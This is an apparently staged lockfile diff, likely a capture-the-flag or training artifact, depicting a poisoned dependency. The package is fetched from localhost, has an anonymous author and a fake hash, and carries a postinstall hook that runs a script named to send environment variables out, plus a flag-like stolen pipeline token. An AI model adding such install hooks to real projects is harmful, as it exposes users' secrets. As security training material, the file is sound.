@@ -1,0 +1,27 @@
+{
+  "name": "apexcorp-dependency-manager",
+  "version": "2.4.1",
+  "lockfileVersion": 3,
+  "auditReportTimestamp": "2026-09-29T10:00:00Z",
+  "dependencies": {
+    "express": {
+      "version": "4.19.2",
+      "resolved": "https://registry.npmjs.org/express/-/express-4.19.2.tgz",
+      "integrity": "sha512-5/psL6iVEkiBV48245/..."
+    },
+    "lodash": {
+      "version": "4.17.21",
+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
+      "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg=="
+    },
+    "apex-internal-telemetry": {
+      "version": "0.1.0-alpha.build.88",
+      "resolved": "http://127.0.0.1:8013/packages/download/apex-internal-telemetry.tgz",
+      "author": "shadow-developer-anonymous",
+      "integrity": "sha512-poisoned_build_hash_xyz",
+      "postinstall_script": "node ./scripts/send_env.js",
+      "exfiltrated_pipeline_token": "ZITERA{5upply_ch41n_p0150n1ng_d3p_2026}",
+      "warning": "CRITICAL: Package not signed with corporate GPG key; untrusted origin."
+    }
+  }
+}
